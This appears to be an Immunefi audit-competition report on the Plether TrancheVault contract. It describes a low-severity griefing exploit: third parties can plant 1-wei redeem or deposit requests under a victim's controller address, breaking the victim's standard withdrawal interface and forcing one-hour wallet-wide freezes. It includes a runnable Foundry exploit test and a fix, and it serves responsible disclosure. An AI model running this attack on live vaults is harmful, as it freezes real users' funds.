# \#97696 [SC-Low] Anyone can poison an LP's withdrawal queue with a 1-wei redeem request, bricking their standard redeem/withdraw interface and forcing a 1-hour wallet-wide lock to clear it

**Submitted on Nov 2nd 2026 at 18:15:40 UTC by @thomasvangurp for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97696
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

`TrancheVault` lets anyone insert a request into another LP's withdrawal queue, because `requestRedeem`/`requestDeposit` check that the caller owns the shares/assets being moved, but never check that the caller is entitled to act as the named `controller` — the account the standard `redeem`/`withdraw`/`maxRedeem`/`maxWithdraw` interface resolves against. An attacker abuses this to jam a 1-wei request into a victim's queue, which permanently reports 0/reverts on the victim's standard interface until the victim manually clears it — and clearing it locks the victim's entire balance for an hour.

### Exploit path

1. Attacker opens a small Junior-tranche position and reduces their own balance to exactly 1 wei of shares.
2. Attacker calls `requestRedeem(1, victim, attacker)` — naming the **victim's** address as `controller`. The vault accepts this because only the shares' owner (the attacker) is checked, not the controller. This request becomes the head of the victim's withdrawal queue.
3. The request settles on its own: 1 wei of shares is worth 0 underlying assets, so the vault auto-classifies it as a refund, not a real withdrawal — it can never be "funded" and cleared automatically.
4. The victim submits a real, legitimate redemption. It gets funded correctly, and the victim *can* claim it by its exact request ID — but every standard-interface call (`maxRedeem`, `redeem`, `maxWithdraw`, `withdraw`) still points at the attacker's junk request at the head of the queue, and reports zero or reverts for the victim.
5. The victim's only way to clear the junk request (`claimRedeemRefund`) has a side effect: it re-arms the victim's withdrawal cooldown, locking the victim's *entire* share balance — any amount, not just the 1 wei — from transfer or further redemption for one hour.
6. The attacker repeats this from a fresh 1-wei wallet (cost ≈$0.000001 + gas) as often as they like, including immediately after the victim clears the last one.

Deposit-side variant: `requestDeposit(1e6, victim, attacker)` gifts the victim 1 USDG and poisons their deposit queue the same way; claiming it re-arms the same cooldown.

### Impact

- Attacker cost: ≈$0.000001 + gas per cycle; principal is never at risk to the attacker or the victim.
- Victim damage per cleanup: a forced 1-hour freeze on their entire tranche balance (any size — e.g. up to the 40M USDG Senior cap), repeatable indefinitely, plus the vault's advertised ERC-4626/ERC-7575 interface (`redeem`/`withdraw`/`maxRedeem`/`maxWithdraw`) staying broken for the victim the whole time the junk request sits unclaimed.

### Why this is not a known issue

A prior audit fix (Cecuro LOW-39/LOW-40) closed a similar griefing path by requiring the claim-side `receiver` to equal the `controller`. That fix only touches *claiming* an existing request. It does nothing to stop a third party from *creating* a request against someone else's controller address in the first place, which is what this report exploits — a different parameter, on the request side, that the prior fix never constrained.

### Proof of Concept

Runnable Foundry PoC attached (`ControllerPoison.t.sol`, added as a new test file — no in-scope contract modified). Run from `packages/perps`:
```
forge test --match-path 'test/perps/hunt/ControllerPoison.t.sol' -vv
```
Observed (independently re-run, not just self-reported):
```
[PASS] test_attacker_poisons_senior_victim_redeem_head() (gas: 2667232)
[PASS] test_attacker_poisons_victim_deposit_head() (gas: 1499781)
[PASS] test_attacker_poisons_victim_redeem_head_and_forces_cooldown() (gas: 2911178)
Suite result: ok. 3 passed; 0 failed; 0 skipped
```
Each test asserts the exact chain above: the junk request lands at the victim's head, the victim's real request is funded but every standard-interface call for the victim returns 0/reverts, the victim's cleanup call re-arms the cooldown and blocks a subsequent transfer, and the explicit-ID claim still pays the victim in full.

### Suggested fix

Require `controller == msg.sender || isOperator[controller][msg.sender]` in `requestDeposit`/`requestRedeem` (the same check already used elsewhere for controller authorization), or add an explicit controller opt-in. Separately, don't re-arm the cooldown on a refund/cancel that clears a request the controller never made.


## Link to Proof of Concept

https://gist.github.com/thomasvangurp/1c68df46113e6e5a23e6c1dcb59a7740

## Proof of Concept

// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

/// @notice PoC: anyone holding 1 wei of tranche shares can enqueue a redeem request whose `controller` is an
///         arbitrary victim. The junk request becomes the victim's controller FIFO head, breaking the ERC-7575
///         `maxRedeem/maxWithdraw/redeem/withdraw` surface for the victim, and the only way for the victim to
///         clear it (`claimRedeemRefund`) stamps a fresh 1-hour cooldown on the victim's entire share balance.
contract ControllerPoisonTest is BasePerpTest {

    address victim = address(0xB1C);
    address attacker = address(0xA77);
    address sink = address(0x51);

    function _settleMaturedEpoch(
        uint256 requestId
    ) internal {
        uint256 start = pool.lpEpochStart(requestId);
        if (block.timestamp < start) {
            vm.warp(start);
        }
        uint256 markPrice = engine.lastMarkPrice();
        vm.prank(address(router));
        engine.updateMarkPrice(markPrice == 0 ? 1e8 : markPrice, SafeCast.toUint64(block.timestamp));
        _settleLpEpochForTest();
    }

    function test_attacker_poisons_victim_redeem_head_and_forces_cooldown() public {
        // Victim is an ordinary Junior LP.
        uint256 victimShares = _fundTrancheAsync(juniorVault, victim, 1000e6);
        // Attacker funds the minimum (1 USDG), then keeps exactly 1 wei of shares.
        uint256 attackerShares = _fundTrancheAsync(juniorVault, attacker, 1e6);
        vm.warp(block.timestamp + 1 hours + 1);
        vm.prank(attacker);
        juniorVault.transfer(sink, attackerShares - 1);
        assertEq(juniorVault.balanceOf(attacker), 1);

        // 1. Attacker enqueues a 1-wei redeem request keyed to the VICTIM as controller.
        vm.prank(attacker);
        uint256 junkId = juniorVault.requestRedeem(1, victim, attacker);
        assertEq(juniorVault.controllerRedeemHead(victim), junkId, "junk request became victim's head");
        assertEq(juniorVault.balanceOf(attacker), 0);

        // 2. The junk epoch matures alone: 1 wei of 9-decimal shares nets to 0 assets, so HousePool refunds it.
        _settleMaturedEpoch(junkId);
        assertEq(juniorVault.refundableRedeemRequest(junkId, victim), 1, "junk epoch is a refund epoch");
        assertEq(juniorVault.controllerRedeemHead(victim), junkId, "head still junk after settlement");

        // 3. Victim later makes a real redeem request, it is funded, and is claimable by explicit id...
        vm.prank(victim);
        uint256 realId = juniorVault.requestRedeem(victimShares, victim, victim);
        _settleMaturedEpoch(realId);
        uint256 realClaimable = juniorVault.claimableRedeemRequest(realId, victim);
        assertEq(realClaimable, victimShares, "real request fully funded");

        // ...but every ERC-7575 head-based entrypoint reports zero / reverts for the victim.
        assertEq(juniorVault.maxRedeem(victim), 0, "maxRedeem poisoned");
        assertEq(juniorVault.maxWithdraw(victim), 0, "maxWithdraw poisoned");
        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, victim, victimShares, 0));
        juniorVault.redeem(victimShares, victim, victim);
        vm.prank(victim);
        vm.expectRevert();
        juniorVault.withdraw(1, victim, victim);

        // 4. The only self-service cleanup forces a fresh 1-hour cooldown on the victim's whole wallet.
        assertLt(juniorVault.lastDepositTime(victim) + 1 hours, block.timestamp, "victim was out of cooldown");
        vm.prank(victim);
        juniorVault.claimRedeemRefund(junkId, victim, victim);
        assertEq(juniorVault.lastDepositTime(victim), block.timestamp, "cooldown stamped by cleanup");
        assertEq(juniorVault.controllerRedeemHead(victim), realId, "head restored only after cleanup");
        assertEq(juniorVault.maxRequestRedeem(victim), 0, "victim cannot request redemption for 1h");
        vm.prank(victim);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(sink, 1);

        // Attacker's cost: 1 wei of a 9-decimal share (gifted to the victim on refund).
        assertEq(juniorVault.balanceOf(victim), 1);

        // 5. Principal is never at risk: the explicit-id claim path still pays the victim in full.
        uint256 victimAssetsBefore = settlementToken.balanceOf(victim);
        vm.prank(victim);
        uint256 paid = juniorVault.claimRedeem(realId, victimShares, victim, victim);
        assertGt(paid, 0);
        assertEq(settlementToken.balanceOf(victim) - victimAssetsBefore, paid);

        // 6. Repeatable: a second prepared 1-wei wallet re-poisons the victim in the same block as the cleanup.
        address attacker2 = address(0xA78);
        vm.prank(sink);
        juniorVault.transfer(attacker2, 1); // sink is out of cooldown (its stamp was copied from attacker)
        vm.prank(attacker2);
        uint256 junk2 = juniorVault.requestRedeem(1, victim, attacker2);
        assertEq(juniorVault.controllerRedeemHead(victim), junk2, "victim re-poisoned immediately");
        assertEq(juniorVault.maxRedeem(victim), 0);
    }

    /// @notice Variant: the same poisoning on the deposit side costs the attacker 1 USDG (gifted to the victim)
    ///         and re-locks the victim's wallet when they claim the unsolicited lot.
    function test_attacker_poisons_victim_deposit_head() public {
        _fundJunior(victim, 1000e6);
        vm.warp(block.timestamp + 1 hours + 1);
        settlementToken.mint(attacker, 1e6);
        vm.startPrank(attacker);
        settlementToken.approve(address(juniorVault), 1e6);
        uint256 junkId = juniorVault.requestDeposit(1e6, victim, attacker);
        vm.stopPrank();
        assertEq(juniorVault.controllerDepositHead(victim), junkId, "junk deposit became victim's head");

        _settleMaturedEpoch(junkId);
        uint256 before = juniorVault.lastDepositTime(victim);
        assertLt(before + 1 hours, block.timestamp, "victim out of cooldown before cleanup");
        uint256 claimable = juniorVault.claimableDepositRequest(junkId, victim);
        vm.prank(victim);
        juniorVault.claimDeposit(junkId, claimable, victim, victim);
        assertGt(juniorVault.lastDepositTime(victim), before, "cleanup re-locks victim wallet");
        assertEq(juniorVault.maxRequestRedeem(victim), 0, "victim cannot request redemption after cleanup");
    }

    /// @notice Senior instance: identical code path.
    function test_attacker_poisons_senior_victim_redeem_head() public {
        uint256 victimShares = _fundTrancheAsync(seniorVault, victim, 1000e6);
        uint256 attackerShares = _fundTrancheAsync(seniorVault, attacker, 1e6);
        vm.warp(block.timestamp + 1 hours + 1);
        vm.prank(attacker);
        seniorVault.transfer(sink, attackerShares - 1);
        vm.prank(attacker);
        uint256 junkId = seniorVault.requestRedeem(1, victim, attacker);
        assertEq(seniorVault.controllerRedeemHead(victim), junkId);
        _settleMaturedEpoch(junkId);
        assertEq(seniorVault.refundableRedeemRequest(junkId, victim), 1, "senior junk epoch refunded");
        vm.prank(victim);
        uint256 realId = seniorVault.requestRedeem(victimShares, victim, victim);
        _settleMaturedEpoch(realId);
        assertEq(seniorVault.claimableRedeemRequest(realId, victim), victimShares);
        assertEq(seniorVault.maxRedeem(victim), 0, "senior maxRedeem poisoned");
        vm.prank(victim);
        seniorVault.claimRedeemRefund(junkId, victim, victim);
        assertEq(seniorVault.lastDepositTime(victim), block.timestamp, "senior cooldown stamped by cleanup");
    }

}

